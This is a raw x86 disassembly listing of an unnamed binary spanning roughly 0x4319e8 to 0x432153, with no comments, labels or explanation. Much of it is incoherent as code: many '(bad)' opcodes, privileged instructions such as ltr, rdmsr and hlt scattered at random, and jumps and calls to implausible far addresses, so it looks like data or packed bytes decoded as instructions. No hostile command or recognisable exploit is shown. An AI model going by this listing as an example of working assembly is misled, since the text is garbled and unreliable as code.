  4319e8:	push   cs
  4319e9:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4319f3:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4319f9:	jnp    0x74439f01
  4319ff:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431a05:	add    BYTE PTR [edi],cl
  431a07:	mov    edi,DWORD PTR [ecx-0x78]
  431a0a:	ltr    WORD PTR [ecx-0x7b]
  431a0e:	dec    DWORD PTR [edi]
  431a10:	clc    
  431a11:	out    0x45,eax
  431a13:	add    BYTE PTR [eax],cl
  431a15:	cmp    ebx,0xffffff8c
  431a18:	jge    0x431a1a
  431a1a:	jb     0x431a2c
  431a1c:	je     0x521a9c
  431a22:	pop    edx
  431a23:	push   esi
  431a24:	mov    ecx,DWORD PTR [edi]
  431a26:	in     al,dx
  431a27:	rol    DWORD PTR [ebp+0x0],1
  431a2a:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431a31:	cmp    DWORD PTR [ecx],0xfffffff0
  431a34:	hlt    
  431a35:	mov    esp,DWORD PTR [eax+0xf034d2b]
  431a3b:	(bad)  
  431a3d:	push   eax
  431a3e:	jns    0xb842febc
  431a44:	lock push cs
  431a46:	ror    edx,0x3
  431a49:	test   BYTE PTR [ecx+0x5500e800],cl
  431a4f:	dec    eax
  431a50:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431a54:	(bad)  
  431a55:	mov    esi,0x7f33ff5f
  431a5a:	inc    eax
  431a5b:	test   DWORD PTR [edx],eax
  431a5d:	je     0x431a1f
  431a5f:	mov    ecx,ecx
  431a61:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431a65:	and    eax,DWORD PTR [eax+0xf0103]
  431a6b:	jp     0x431a59
  431a6d:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431a71:	add    edx,DWORD PTR [edi+0x74]
  431a74:	sbb    BYTE PTR [ebp+0x4d001484],cl
  431a7a:	add    BYTE PTR [ebp-0x74c48bbb],al
  431a80:	je     0x431a05
  431a82:	cmp    eax,edi
  431a84:	js     0x431aa9
  431a86:	add    eax,0xeb0fc003
  431a8b:	jns    0x431a18
  431a8d:	vmread DWORD PTR [ecx+0x45],ebx
  431a91:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431a97:	adc    al,0x8b
  431a99:	jge    0x431aaf
  431a9b:	mov    edi,DWORD PTR [eax-0x4]
  431a9e:	add    edi,DWORD PTR [edi]
  431aa0:	or     bh,bh
  431aa2:	push   ebp
  431aa3:	push   es
  431aa4:	mov    DWORD PTR [ebp-0x4],ebx
  431aa7:	add    edi,esi
  431aa9:	pop    es
  431aaa:	add    esi,DWORD PTR [edi-0x48ccf183]
  431ab0:	mov    DWORD PTR [esp+esi*8],ecx
  431ab3:	inc    ebp
  431ab4:	pop    ebp
  431ab5:	xor    DWORD PTR [esi-0x4],0x3b
  431ab9:	add    edx,DWORD PTR [ecx+edi*1]
  431abc:	push   es
  431abd:	clc    
  431abe:	mov    bh,0xdb
  431ac0:	jp     0x431a79
  431ac2:	add    cl,BYTE PTR [esi]
  431ac4:	div    DWORD PTR [edi+0x4d8b0c1c]
  431aca:	test   edi,edi
  431acc:	je     0x431ac2
  431ace:	mov    eax,ecx
  431ad0:	or     BYTE PTR [ebx],al
  431ad2:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431ad8:	jbe    0x431b4c
  431ada:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431ae0:	add    ecx,DWORD PTR [esi]
  431ae2:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431ae8:	add    eax,DWORD PTR [ebx-0x287af783]
  431aee:	je     0x431b3d
  431af0:	mov    DWORD PTR [ecx],edi
  431af2:	mov    esi,eax
  431af4:	hlt    
  431af5:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431afc:	jb     0x431abe
  431afe:	jmp    0x431aeb
  431b00:	xor    esi,DWORD PTR [ebx]
  431b02:	pop    edi
  431b03:	pop    esi
  431b04:	pop    ebx
  431b05:	ret    
  431b06:	ret    0x8b
  431b09:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431b0f:	xor    DWORD PTR [ecx],0xc
  431b12:	pushf  
  431b13:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431b19:	rdmsr  
  431b1b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431b22:	dec    ebp
  431b23:	ret    
  431b24:	mov    edi,DWORD PTR [esi-0x4]
  431b27:	pop    eax
  431b28:	dec    ebp
  431b29:	jne    0x431ab6
  431b2b:	xor    edi,esp
  431b2d:	inc    eax
  431b2e:	dec    ebp
  431b2f:	jbe    0x431b84
  431b31:	inc    eax
  431b32:	pop    ebp
  431b33:	add    edx,DWORD PTR [esi+0x8]
  431b36:	push   esp
  431b37:	dec    eax
  431b38:	push   ecx
  431b39:	mov    eax,edi
  431b3b:	and    al,0xf0
  431b3d:	jo     0x431b2a
  431b3f:	mov    eax,DWORD PTR [ebx]
  431b41:	sbb    BYTE PTR [ebp+0x4d],cl
  431b44:	mov    eax,DWORD PTR [ebx]
  431b46:	nop
  431b47:	or     BYTE PTR [eax],al
  431b49:	jne    0x431ba2
  431b4b:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431b51:	cld    
  431b52:	xor    edi,edi
  431b54:	add    edi,DWORD PTR [ebp+0x3]
  431b57:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431b5d:	js     0x431ae3
  431b5f:	jae    0x431b63
  431b61:	(bad)  
  431b63:	xor    al,0x5d
  431b65:	jmp    0x431af2
  431b67:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431b6e:	fdecstp 
  431b70:	test   BYTE PTR [edi],ah
  431b72:	add    bh,BYTE PTR [ebp+0x0]
  431b75:	add    ebx,DWORD PTR [ebp-0x77]
  431b78:	mov    edi,eax
  431b7a:	cmp    al,0x0
  431b7d:	adc    dh,BYTE PTR [ebx]
  431b7f:	jge    0x431b84
  431b81:	mov    edi,DWORD PTR [ebx]
  431b83:	jl     0x431b94
  431b85:	clc    
  431b86:	dec    edi
  431b87:	jge    0x431b89
  431b89:	mov    eax,DWORD PTR [ebx]
  431b8b:	jb     0x431b95
  431b8d:	mov    ecx,DWORD PTR [ebp-0x8]
  431b90:	mov    edi,edi
  431b92:	xor    edx,DWORD PTR [eax]
  431b94:	add    edi,DWORD PTR [ebx]
  431b96:	mov    DWORD PTR [ebp-0x10],edi
  431b99:	inc    edi
  431b9a:	pop    ebp
  431b9b:	jge    0x431bd8
  431b9d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431ba1:	mov    edx,0xc05d87f0
  431ba6:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431baa:	fimul  WORD PTR [eax]
  431bac:	fist   WORD PTR [ebp+0x1c]
  431baf:	in     al,dx
  431bb0:	jne    0x431b9e
  431bb2:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431bb8:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431bbc:	fdivp  st(0),st
  431bbe:	fild   WORD PTR [ebp+0x4510f85c]
  431bc4:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431bca:	inc    ebp
  431bcb:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431bd1:	mov    ebp,DWORD PTR [ebx-0x4]
  431bd4:	adc    al,0x8b
  431bd6:	rcl    DWORD PTR [eax],0x48
  431bd9:	mov    esi,0x7080803
  431bde:	fiadd  WORD PTR [ebp+0x4d]
  431be1:	(bad)  
  431be2:	mov    edx,DWORD PTR [edx-0x4]
  431be5:	mov    edx,DWORD PTR [ebp-0x4]
  431be8:	xor    ebx,DWORD PTR [ebx+0x330103]
  431bee:	mov    DWORD PTR [edi+0x872dc],edi
  431bf4:	xlat   BYTE PTR ds:[ebx]
  431bf5:	into   
  431bf6:	ffreep st(6)
  431bf8:	retf   0x6c7
  431bfb:	iret   
  431bfc:	dec    ebp
  431bfd:	inc    ebp
  431bfe:	mov    DWORD PTR [ebx],edi
  431c00:	fmul   QWORD PTR [edi]
  431c02:	dec    ebp
  431c03:	jnp    0x431c38
  431c05:	add    BYTE PTR [ebx],al
  431c07:	mov    ecx,DWORD PTR [esp+edi*8]
  431c0a:	inc    ebp
  431c0b:	dec    ebp
  431c0c:	lea    esi,[ebx]
  431c0e:	add    DWORD PTR [ebx],eax
  431c10:	jb     0x431c4d
  431c12:	add    BYTE PTR [edi],cl
  431c14:	inc    ebp
  431c15:	imul   eax,edi,0x858bd800
  431c1b:	cld    
  431c1c:	clc    
  431c1d:	mov    DWORD PTR [ebp+0x0],eax
  431c20:	inc    DWORD PTR [eax]
  431c22:	or     al,0xde
  431c24:	sbb    bh,0x1
  431c27:	retf   
  431c28:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431c2f:	dec    ebp
  431c30:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431c36:	enter  0x12de,0xdf
  431c3a:	inc    ebp
  431c3b:	pop    ebp
  431c3c:	dec    DWORD PTR [ebx-0x257f0ff4]
  431c42:	add    DWORD PTR [edx],edx
  431c44:	add    BYTE PTR [ebp+0x50],dl
  431c47:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431c4d:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431c53:	or     ah,al
  431c55:	pop    ss
  431c56:	cdq    
  431c57:	push   ebp
  431c58:	clc    
  431c59:	mov    eax,DWORD PTR [ebp-0x4]
  431c5c:	xor    edx,edx
  431c5e:	add    esi,DWORD PTR [ebx]
  431c60:	cmp    eax,DWORD PTR [ebx]
  431c62:	hlt    
  431c63:	cmp    DWORD PTR [ebx],esp
  431c65:	or     al,BYTE PTR [ebp+0xf]
  431c68:	mov    eax,DWORD PTR [edx]
  431c6a:	loopne 0x431c6c
  431c6c:	(bad)  
  431c6d:	mov    ecx,esi
  431c6f:	cld    
  431c70:	pushf  
  431c71:	pop    ebp
  431c72:	fwait
  431c73:	mov    esi,DWORD PTR [edx]
  431c75:	lock mov eax,eax
  431c78:	adc    BYTE PTR [ebx],al
  431c7a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431c81:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431c87:	dec    ebp
  431c88:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431c8e:	(bad)  
  431c8f:	iret   
  431c90:	inc    ebp
  431c91:	(bad)  
  431c92:	jne    0x431ce1
  431c94:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431c9a:	(bad)  
  431c9b:	cmp    ebx,eax
  431c9d:	je     0x431c25
  431c9f:	add    edi,edi
  431ca1:	or     bh,bh
  431ca3:	dec    ebp
  431ca4:	inc    ebp
  431ca5:	mov    esi,DWORD PTR [ebx]
  431ca7:	cld    
  431ca8:	add    ecx,esi
  431caa:	cmp    ecx,DWORD PTR [eax-0xc]
  431cad:	mov    edx,DWORD PTR [edi]
  431caf:	or     BYTE PTR [ebp-0x7c],al
  431cb2:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431cb8:	test   BYTE PTR [ebx+ebx*4],cl
  431cbb:	inc    ebp
  431cbc:	xor    bh,BYTE PTR [esi]
  431cbe:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431cc5:	jne    0x431c8e
  431cc7:	mov    ebp,esp
  431cc9:	fcomp  DWORD PTR [ebx]
  431ccb:	add    BYTE PTR [ecx],al
  431ccd:	inc    DWORD PTR [ebp-0x75]
  431cd0:	(bad)  
  431cd1:	cld    
  431cd2:	add    al,0xce
  431cd4:	mov    ecx,edi
  431cd6:	cld    
  431cd7:	inc    ebp
  431cd8:	fidivr WORD PTR [ebx]
  431cda:	fbstp  TBYTE PTR [ebp-0x3e]
  431cdd:	mov    eax,DWORD PTR [eax]
  431cdf:	adc    BYTE PTR [ebx-0x3974038b],cl
  431ce5:	fadd   st,st(7)
  431ce7:	add    BYTE PTR [ebp-0x1],al
  431cea:	mov    ecx,DWORD PTR [esp+edi*8]
  431ced:	inc    ebp
  431cee:	mov    bh,0xc7
  431cf1:	loopne 0x431d38
  431cf3:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431cf9:	sbb    dh,BYTE PTR [ebx]
  431cfb:	pushf  
  431cfc:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431d02:	mov    eax,edi
  431d04:	cwde   
  431d05:	inc    ebp
  431d06:	inc    ebp
  431d07:	jne    0x431c94
  431d09:	mov    esp,esp
  431d0b:	clc    
  431d0c:	add    al,0x4d
  431d0e:	mov    DWORD PTR [ebx],esi
  431d10:	or     al,0x33
  431d12:	inc    ebp
  431d13:	lea    ecx,[ebx-0x398d13fd]
  431d19:	add    bh,al
  431d1b:	inc    ebp
  431d1c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431d23:	add    ebp,esp
  431d25:	shufps xmm1,xmm3,0xc7
  431d29:	(bad)  
  431d2a:	jmp    0x74885853
  431d2f:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431d35:	hlt    
  431d36:	mov    ecx,DWORD PTR [edi]
  431d38:	fadd   DWORD PTR [ebp+0x0]
  431d3b:	xor    ecx,DWORD PTR [edi]
  431d3d:	add    ecx,ecx
  431d3f:	cmp    edi,edi
  431d41:	pmuludq mm7,QWORD PTR [edx+0x50]
  431d45:	(bad)  
  431d46:	jmp    0x431cd3
  431d48:	mov    edi,esp
  431d4a:	or     al,0xc6
  431d4c:	inc    ebp
  431d4d:	(bad)  
  431d4e:	mov    eax,DWORD PTR [ebp+0x10]
  431d51:	jne    0x431cdc
  431d53:	mov    eax,DWORD PTR [ecx]
  431d55:	clc    
  431d56:	add    BYTE PTR [ebp-0x40],cl
  431d59:	xor    edx,DWORD PTR [eax-0x73]
  431d5c:	jne    0x431d5f
  431d5e:	push   DWORD PTR [edx+0x8]
  431d61:	add    BYTE PTR [ebp+0x45],al
  431d64:	mov    ebp,ecx
  431d66:	cld    
  431d67:	add    BYTE PTR [ebp+0x0],cl
  431d6a:	xor    eax,DWORD PTR [ebp+0x3]
  431d6d:	mov    DWORD PTR [ebx],edi
  431d6f:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431d75:	sub    eax,0x5d330e4d
  431d7a:	lea    esi,[ebx]
  431d7c:	add    DWORD PTR [ebx],eax
  431d7e:	jb     0x431d69
  431d80:	add    BYTE PTR [eax],al
  431d82:	inc    ebp
  431d83:	add    bl,ch
  431d85:	inc    ebp
  431d86:	mov    esi,DWORD PTR [ebx]
  431d88:	or     al,0x3
  431d8a:	(bad)  
  431d8b:	mov    edi,eax
  431d8d:	in     al,dx
  431d8e:	scas   eax,DWORD PTR es:[edi]
  431d8f:	inc    ebp
  431d90:	mov    esi,DWORD PTR [ebx]
  431d92:	in     al,0x3
  431d94:	add    al,0x89
  431d96:	mov    ecx,DWORD PTR [eax+edi*8]
  431d99:	dec    ebp
  431d9a:	(bad)  
  431d9b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431da2:	mov    ecx,eax
  431da4:	cld    
  431da5:	push   es
  431da6:	dec    ebp
  431da7:	add    al,0x33
  431da9:	mov    DWORD PTR [ebx],eax
  431dab:	in     al,dx
  431dac:	cmp    DWORD PTR [ebp-0x67],eax
  431daf:	mov    eax,DWORD PTR [ebp-0xba0068]
  431db5:	mov    edx,DWORD PTR [ebp-0x4]
  431db8:	mov    ecx,DWORD PTR [ebp-0x2c]
  431dbb:	xor    eax,DWORD PTR [ebp+0x3]
  431dbe:	cmp    DWORD PTR [ebx],0x8b32749a
  431dc4:	xor    edi,esp
  431dc6:	jmp    0xff771b18
  431dcb:	add    ecx,DWORD PTR [ebp-0x3f]
  431dce:	xor    ebx,DWORD PTR [edi]
  431dd0:	add    eax,ecx
  431dd2:	cmp    ebx,DWORD PTR [eax]
  431dd4:	mov    ecx,DWORD PTR [ebp-0x4]
  431dd7:	mov    ecx,DWORD PTR [eax]
  431dd9:	adc    BYTE PTR [ebp-0x80],al
  431ddc:	jmp    0x431ddf
  431dde:	mov    eax,DWORD PTR [eax]
  431de0:	cld    
  431de1:	mov    bh,0xc6
  431de3:	push   ecx
  431de4:	(bad)  
  431de5:	jne    0x431e45
  431de7:	dec    ecx
  431de9:	or     BYTE PTR [ecx+ebx*1],cl
  431dec:	push   ebp
  431ded:	inc    ebp
  431dee:	in     al,dx
  431def:	add    ebp,esp
  431df1:	or     bh,al
  431df3:	dec    ebp
  431df4:	cld    
  431df5:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431dfb:	xor    DWORD PTR [edx],0x2
  431dfe:	pushf  
  431dff:	dec    DWORD PTR [ebx+0x45510cf4]
  431e05:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431e0b:	mov    edx,DWORD PTR [ecx+0xc]
  431e0e:	xor    eax,esi
  431e10:	mov    edx,0xc172c7
  431e15:	inc    ebp
  431e16:	mov    esi,DWORD PTR [ebp+0x8]
  431e19:	mov    eax,edx
  431e1b:	call   0x84c7e510
  431e20:	add    DWORD PTR [ebx-0x76bace00],ebx
  431e26:	mov    ebp,eax
  431e28:	or     BYTE PTR [eax],dl
  431e2a:	jo     0x431e79
  431e2c:	push   edi
  431e2d:	xor    esi,DWORD PTR [ebp+0x3]
  431e30:	(bad)  
  431e31:	pmulhuw mm0,mm1
  431e34:	test   DWORD PTR [ebp-0x8],ecx
  431e37:	mov    DWORD PTR [ebp-0x67],eax
  431e3a:	mov    eax,DWORD PTR [ebp-0x4]
  431e3d:	xor    edi,DWORD PTR [ebp-0x73]
  431e40:	xor    eax,DWORD PTR [ebx]
  431e42:	xor    esi,DWORD PTR [edx+0x3]
  431e45:	add    BYTE PTR [ecx],bh
  431e47:	inc    ebp
  431e48:	(bad)  
  431e49:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431e4f:	mov    DWORD PTR [eax],0x750f0004
  431e55:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431e5b:	lock add BYTE PTR [ebp+0x0],cl
  431e5f:	mov    esi,DWORD PTR [ebp-0x18]
  431e62:	mov    ebp,edx
  431e64:	or     al,0x72
  431e66:	ja     0x431e68
  431e68:	mov    edx,esi
  431e6a:	cld    
  431e6b:	(bad)  
  431e6e:	cli    
  431e6f:	mov    esi,DWORD PTR [ebp-0x4]
  431e72:	cmp    ecx,esi
  431e74:	bswap  edi
  431e76:	(bad)
  431e7a:	mov    esi,DWORD PTR [ebp-0x4]
  431e7d:	mov    esi,ecx
  431e7f:	clc    
  431e80:	repnz add esi,DWORD PTR [ebp+0x45]
  431e84:	push   ebx
  431e85:	xor    eax,DWORD PTR [ebp+0x3]
  431e88:	cmp    al,0x5f
  431e8a:	pushf  
  431e8b:	pop    ebx
  431e8c:	jmp    0x431f53
  431e91:	mov    esi,DWORD PTR [ebp-0x7d]
  431e94:	xor    ebp,DWORD PTR [eax]
  431e96:	lea    eax,[ebp-0x8]
  431e99:	xor    edx,esi
  431e9b:	pushf  
  431e9c:	out    dx,eax
  431e9d:	(bad)  
  431e9e:	neg    eax
  431ea0:	ins    DWORD PTR es:[edi],dx
  431ea1:	test   esi,edi
  431ea3:	clc    
  431ea4:	pop    esp
  431ea5:	inc    ebp
  431ea6:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431eac:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431eb2:	add    cl,al
  431eb4:	jne    0x431e51
  431eb6:	mov    esi,DWORD PTR [edx]
  431eb8:	in     al,dx
  431eb9:	push   esi
  431eba:	xor    BYTE PTR [ebp-0xe],dh
  431ebd:	add    edi,esi
  431ebf:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431ec5:	add    cl,bh
  431ec7:	mov    edi,DWORD PTR [ebp+0x8]
  431eca:	mov    DWORD PTR [ebp-0x14],esi
  431ecd:	add    esi,DWORD PTR [ebp+0x3c]
  431ed0:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431ed6:	mov    ah,0x3e
  431ed8:	fwait
  431ed9:	pushf  
  431eda:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431ee0:	jne    0x431e6d
  431ee2:	mov    ecx,DWORD PTR [esp+ebp*8]
  431ee5:	icebp  
  431ee6:	icebp  
  431ee7:	shl    edx,0xf2
  431eea:	(bad)  
  431eeb:	mov    ah,0x16
  431eed:	push   eax
  431eee:	jne    0x431e83
  431ef0:	mov    ecx,DWORD PTR [edi]
  431ef2:	in     al,dx
  431ef3:	jmp    0x431ee6
  431ef5:	add    dl,dh
  431ef7:	mov    edi,esi
  431ef9:	or     al,0x8
  431efb:	inc    ebp
  431efc:	jne    0x431f01
  431efe:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431f04:	ret    
  431f05:	or     bh,bh
  431f07:	jge    0x431ef1
  431f09:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431f0f:	xor    edi,eax
  431f11:	add    esi,DWORD PTR [ebp-0x77]
  431f14:	mov    ebx,esp
  431f16:	clc    
  431f17:	neg    DWORD PTR [ebp-0x7c]
  431f1a:	xor    eax,DWORD PTR [eax]
  431f1c:	cmp    eax,DWORD PTR [eax]
  431f1e:	repz jne 0x431eb6
  431f21:	xor    eax,DWORD PTR [ecx]
  431f23:	add    ebx,DWORD PTR [eax]
  431f25:	mov    DWORD PTR [ebp-0x8],eax
  431f28:	mov    eax,edi
  431f2a:	cld    
  431f2b:	lock pop eax
  431f2d:	test   DWORD PTR [ebx],esi
  431f2f:	clc    
  431f30:	add    edx,DWORD PTR [edi-0x740bff77]
  431f36:	fdivp  st(4),st
  431f38:	test   ecx,esi
  431f3a:	(bad)  
  431f3b:	jnp    0x431f3c
  431f3d:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431f43:	jae    0x431ed0
  431f45:	sub    edi,esp
  431f47:	(bad)  
  431f48:	shl    DWORD PTR [eax-0x3e],0x89
  431f4c:	leave  
  431f4d:	call   0x8198d65a
  431f52:	in     al,dx
  431f53:	(bad)  
  431f54:	in     al,dx
  431f55:	add    bh,al
  431f57:	mov    esp,edi
  431f59:	in     al,dx
  431f5a:	test   DWORD PTR [ebp-0x8],edi
  431f5d:	mov    eax,DWORD PTR [ebp+0x2b]
  431f60:	xor    al,BYTE PTR [ebx]
  431f62:	pushf  
  431f63:	jnp    0x57321b9c
  431f69:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431f6d:	loopne 0x431fa2
  431f6f:	jne    0x431f2c
  431f71:	mov    esi,DWORD PTR [edx-0x20]
  431f74:	add    BYTE PTR [ebp-0x3d],bh
  431f77:	xor    eax,DWORD PTR [ebp-0x73]
  431f7a:	mov    edi,DWORD PTR [esi]
  431f7c:	cld    
  431f7d:	jb     0x431f45
  431f7f:	add    bl,al
  431f81:	jne    0x431fc8
  431f83:	mov    edx,DWORD PTR [edi-0x10]
  431f86:	jge    0x432005
  431f88:	mov    esi,DWORD PTR [ebx]
  431f8a:	lock add ecx,DWORD PTR [ebp+0x3b]
  431f8e:	xor    esi,DWORD PTR [ebp-0x77]
  431f91:	mov    esi,eax
  431f93:	lock inc ebp
  431f95:	jge    0x431fc8
  431f97:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431f9e:	dec    ebp
  431f9f:	mov    esi,DWORD PTR [ebx]
  431fa1:	loopne 0x431f2c
  431fa3:	jge    0x431f9d
  431fa5:	add    DWORD PTR [ebp-0x7d],eax
  431fa8:	icebp  
  431fa9:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431fb0:	dec    ebp
  431fb1:	hlt    
  431fb2:	xor    ebx,DWORD PTR [ebp-0x77]
  431fb5:	mov    esi,esp
  431fb7:	in     al,0x45
  431fb9:	jge    0x431ff8
  431fbb:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431fc2:	dec    ebp
  431fc3:	push   esp
  431fc4:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431fca:	inc    ebp
  431fcb:	hlt    
  431fcc:	xor    DWORD PTR [ebp-0x61],esi
  431fcf:	mov    edi,DWORD PTR [eax+0xf19504]
  431fd5:	repnz mov DWORD PTR [ebp+0x20],ebx
  431fd9:	cmp    eax,DWORD PTR [ebp+0xf]
  431fdc:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431fe0:	fistp  WORD PTR [ebx+0x0]
  431fe3:	inc    ebp
  431fe4:	mov    ebx,DWORD PTR [edi+0xc]
  431fe7:	add    eax,eax
  431fe9:	inc    ebp
  431fea:	test   BYTE PTR [ebx],dh
  431fec:	add    eax,DWORD PTR [ebx]
  431fee:	add    BYTE PTR [esi+0x45],bl
  431ff1:	ret    0x85
  431ff4:	jnp    0x5443a3c3
  431ffa:	inc    bp
  431ffc:	inc    ebp
  431ffd:	xor    DWORD PTR [ecx+0xc78a9c],edi
  432003:	fdiv   QWORD PTR [ebx]
  432005:	test   DWORD PTR [ecx+0x453bf8],edi
  43200b:	push   ebx
  43200c:	add    edi,DWORD PTR [esi+0x708088b]
  432012:	cmp    esi,eax
  432014:	setnp  BYTE PTR [ecx-0x74fcffce]
  43201b:	mov    esp,edi
  43201d:	call   0x33ce656f
  432022:	or     BYTE PTR [ebx],al
  432024:	inc    ecx
  432025:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  43202b:	and    BYTE PTR [ebp-0x7074f0bb],al
  432031:	lock add cl,al
  432034:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  43203b:	mov    ch,0x45
  43203d:	clc    
  43203e:	xor    eax,DWORD PTR [ebp+0x3]
  432041:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  432047:	inc    ebp
  432048:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  43204e:	mov    edi,eax
  432050:	mov    eax,DWORD PTR [ebp+0x3c]
  432053:	mov    ecx,DWORD PTR [eax]
  432055:	hlt    
  432056:	inc    ebp
  432057:	ror    DWORD PTR [ebx+0x818c45],0xf4
  43205e:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432064:	push   ebp
  432065:	mov    edi,DWORD PTR [ebx]
  432067:	in     al,dx
  432068:	jne    0x43202b
  43206a:	mov    eax,DWORD PTR [ebp-0x28]
  43206d:	add    DWORD PTR [eax],0xe8058dec
  432073:	clc    
  432074:	mov    esi,DWORD PTR [edi-0x8]
  432077:	add    dh,dl
  432079:	rol    WORD PTR [ebp-0x1],cl
  43207d:	mov    edx,DWORD PTR [eax+0x8]
  432080:	jne    0x432042
  432082:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432089:	inc    ebp
  43208a:	push   esp
  43208b:	test   DWORD PTR [ecx+0xf],ecx
  43208e:	sub    edx,esp
  432090:	add    eax,DWORD PTR [eax]
  432092:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432098:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  43209f:	mov    eax,DWORD PTR [ecx]
  4320a1:	and    BYTE PTR [eax],al
  4320a3:	cmp    al,0x10
  4320a5:	add    BYTE PTR [ebp+0x66],al
  4320a8:	inc    ecx
  4320aa:	push   esp
  4320ab:	add    dh,BYTE PTR [ebp+0x0]
  4320ae:	push   edx
  4320af:	enterw 0xc1,0x4d
  4320b4:	mov    esp,DWORD PTR [esi+0x20]
  4320b7:	add    DWORD PTR [ecx-0x7b],eax
  4320ba:	add    eax,DWORD PTR [ebx]
  4320bc:	str    WORD PTR [eax+0x45]
  4320c0:	lea    ecx,[ebx+0x45890801]
  4320c6:	sbb    BYTE PTR [ebx],al
  4320c8:	dec    ebp
  4320c9:	cmp    al,0xf
  4320cb:	inc    ebp
  4320cc:	push   eax
  4320cd:	mov    esi,DWORD PTR [ebx]
  4320cf:	push   eax
  4320d0:	add    eax,eax
  4320d2:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  4320d9:	inc    ebp
  4320da:	add    BYTE PTR [ecx],dh
  4320dc:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  4320e3:	(bad)  
  4320e4:	mov    ebx,eax
  4320e6:	loopne 0x43212d
  4320e8:	dec    ebp
  4320e9:	mov    ecx,DWORD PTR [edi]
  4320eb:	cld    
  4320ec:	push   eax
  4320ed:	xchg   DWORD PTR [ebx],esi
  4320ef:	add    DWORD PTR [ebx],ebp
  4320f1:	add    BYTE PTR [ebx],ch
  4320f3:	or     BYTE PTR [ecx],bh
  4320f5:	dec    ecx
  4320f6:	loopne 0x4320fb
  4320f8:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  4320fe:	push   ebp
  4320ff:	add    DWORD PTR [ebx+0x55100800],eax
  432105:	dec    ebp
  432106:	jmp    0x432091
  432108:	mov    esp,DWORD PTR [eax]
  43210a:	sbb    dl,dl
  43210c:	inc    eax
  43210d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432113:	add    BYTE PTR [ebx+0x74528555],cl
  432119:	push   ebp
  43211a:	div    DWORD PTR [ebx]
  43211c:	and    eax,DWORD PTR [ebx]
  43211e:	add    edx,DWORD PTR [edx-0x30]
  432121:	jno    0x4320ae
  432123:	inc    DWORD PTR [eax+eiz*1]
  432126:	inc    ebp
  432127:	push   eax
  432128:	push   eax
  432129:	mov    esp,DWORD PTR [edi-0x74beff1c]
  43212f:	mov    edi,esp
  432131:	push   eax
  432132:	inc    ebp
  432133:	enter  0x458b,0x8
  432137:	push   ecx
  432138:	(bad)  
  432139:	call   0x10d2b11
  43213e:	pop    ss
  43213f:	push   ebp
  432140:	mov    ecx,DWORD PTR [ebx+0x489408]
  432146:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  43214c:	push   ecx
  43214d:	jo     0x432137
  43214f:	inc    DWORD PTR [edi]
  432151:	or     BYTE PTR [eax],al
  432153:	call   0xce289d
